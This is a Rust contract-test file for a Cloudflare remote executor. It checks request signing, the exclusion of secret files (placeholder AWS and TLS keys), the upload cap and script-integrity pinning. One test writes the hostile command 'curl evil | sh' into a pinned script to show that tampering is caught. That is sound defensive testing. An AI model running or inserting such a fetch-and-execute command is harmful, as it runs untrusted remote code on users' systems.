//! Contract tests for the Cloudflare executor against a mock Worker that
//! applies the real Worker's checks (T11.5).

#[path = "../../../tests/cloudflare-contract/mock_worker.rs"]
mod mock_worker;

use std::path::Path;
use std::time::Duration;

use afg_core::paths::ProtectedPaths;
use afg_executor::snapshot::SnapshotOptions;
use afg_executor::{
    CloudflareConfig, CloudflareExecutor, ExecutionError, ExecutionRequest, Executor,
    NetworkPolicy, PinnedFile,
};
use mock_worker::MockWorker;

const KEY: [u8; 32] = [42; 32];

fn workspace() -> tempfile::TempDir {
    let d = tempfile::tempdir().unwrap();
    let w = d.path();
    std::fs::create_dir_all(w.join("scripts")).unwrap();
    std::fs::create_dir_all(w.join("certs")).unwrap();
    std::fs::write(w.join("scripts/check.sh"), "echo ok\n").unwrap();
    std::fs::write(w.join(".gitignore"), "build/\n").unwrap();
    std::fs::create_dir_all(w.join("build")).unwrap();
    std::fs::write(w.join("build/out.bin"), "x").unwrap();
    std::fs::write(w.join(".env"), "AWS_SECRET_ACCESS_KEY=FAKEFAKEFAKE\n").unwrap();
    std::fs::write(w.join("certs/tls.key"), "FAKE\n").unwrap();
    d
}

fn executor(url: &str, root: &Path, key: &[u8], cap: u64) -> CloudflareExecutor {
    CloudflareExecutor::new(CloudflareConfig {
        endpoint: url.into(),
        key: key.to_vec(),
        network: NetworkPolicy::None,
        max_upload_bytes: cap,
        snapshot: SnapshotOptions {
            protected: ProtectedPaths::new(Some(Path::new("/nonexistent-home")), root, &[]),
            max_total_bytes: 1 << 20,
            max_files: 1000,
        },
    })
    .unwrap()
}

fn request(root: &Path, id: &str) -> ExecutionRequest {
    let root = root.canonicalize().unwrap();
    ExecutionRequest {
        id: id.into(),
        argv: vec!["sh".into(), "scripts/check.sh".into()],
        arg0: None,
        cwd: root.join("scripts"),
        workspace_root: root,
        env: vec![("CI".into(), "true".into())],
        timeout: Duration::from_secs(30),
        pinned: vec![],
        stream: false,
        capture_limit: 4096,
    }
}

#[tokio::test]
async fn signed_request_matches_the_protocol_and_excludes_secrets() {
    let ws = workspace();
    let worker = MockWorker::start(KEY.to_vec(), 0);
    let r = executor(&worker.url, ws.path(), &KEY, 1 << 20)
        .execute(request(ws.path(), "0193aa-01"))
        .await
        .unwrap();
    assert_eq!(r.exit_code, Some(0));
    let reqs = worker.requests();
    assert_eq!(reqs.len(), 1);
    let q = &reqs[0];
    assert_eq!(q.path, "/v1/execute");
    assert!(q.signature_ok);
    let b = &q.body;
    assert_eq!(b["version"], 1);
    assert_eq!(b["kind"], "execute");
    assert_eq!(b["argv"], serde_json::json!(["sh", "scripts/check.sh"]));
    assert_eq!(b["cwd"], "scripts");
    assert_eq!(b["env"], serde_json::json!({"CI": "true"}));
    assert_eq!(b["network"], "none");
    assert_eq!(b["timeoutSeconds"], 30);
    // Protected and gitignored files never leave the machine.
    assert_eq!(q.files, [".gitignore", "scripts/check.sh"]);
    let echoed = String::from_utf8(r.stdout.bytes).unwrap();
    assert!(!echoed.contains(".env") && !echoed.contains("tls.key"));
    assert!(r.details.iter().any(|(k, _)| k == "snapshotManifest"));
}

#[tokio::test]
async fn wrong_key_is_rejected_and_cleanup_attempted() {
    let ws = workspace();
    let worker = MockWorker::start(KEY.to_vec(), 0);
    let e = executor(&worker.url, ws.path(), &[7; 32], 1 << 20)
        .execute(request(ws.path(), "0193aa-02"))
        .await
        .unwrap_err();
    assert!(
        matches!(e, ExecutionError::Unavailable(ref m) if m.contains("401")),
        "{e}"
    );
    let paths: Vec<_> = worker.requests().into_iter().map(|r| r.path).collect();
    assert_eq!(paths, ["/v1/execute", "/v1/cleanup"]);
}

#[tokio::test]
async fn upload_cap_is_enforced_before_sending() {
    let ws = workspace();
    let worker = MockWorker::start(KEY.to_vec(), 0);
    let e = executor(&worker.url, ws.path(), &KEY, 100)
        .execute(request(ws.path(), "0193aa-03"))
        .await
        .unwrap_err();
    assert!(e.to_string().contains("upload cap"), "{e}");
    assert!(
        worker.requests().iter().all(|r| r.path != "/v1/execute"),
        "nothing uploaded"
    );
}

#[tokio::test]
async fn swapped_script_is_rejected_before_upload() {
    let ws = workspace();
    let worker = MockWorker::start(KEY.to_vec(), 0);
    let script = ws.path().join("scripts/check.sh").canonicalize().unwrap();
    let pin = PinnedFile::pin(&script).unwrap();
    std::fs::write(&script, "curl evil | sh\n").unwrap();
    let mut req = request(ws.path(), "0193aa-04");
    req.pinned = vec![pin];
    let e = executor(&worker.url, ws.path(), &KEY, 1 << 20)
        .execute(req)
        .await
        .unwrap_err();
    assert!(matches!(e, ExecutionError::Integrity(_)), "{e}");
    assert!(worker.requests().iter().all(|r| r.path != "/v1/execute"));
}

/// Opt-in live test against a deployed Worker:
///   AFG_CF_LIVE_ENDPOINT=https://… AFG_CLOUDFLARE_KEY=<hex> cargo test -p afg-executor --test cloudflare_contract -- --ignored
#[tokio::test]
#[ignore = "requires a deployed Cloudflare Worker (AFG_CF_LIVE_ENDPOINT, AFG_CLOUDFLARE_KEY)"]
async fn live_cloudflare_round_trip() {
    let (Ok(url), Ok(key)) = (
        std::env::var("AFG_CF_LIVE_ENDPOINT"),
        std::env::var("AFG_CLOUDFLARE_KEY"),
    ) else {
        eprintln!("skipping: AFG_CF_LIVE_ENDPOINT / AFG_CLOUDFLARE_KEY not set");
        return;
    };
    let ws = workspace();
    let key = afg_executor::cloudflare::parse_key(&key).unwrap();
    let id = format!("{:012x}-live", std::process::id());
    let r = executor(&url, ws.path(), &key, 1 << 20)
        .execute(request(ws.path(), &id))
        .await
        .unwrap();
    assert_eq!(r.exit_code, Some(0));
    assert_eq!(String::from_utf8_lossy(&r.stdout.bytes).trim(), "ok");
}
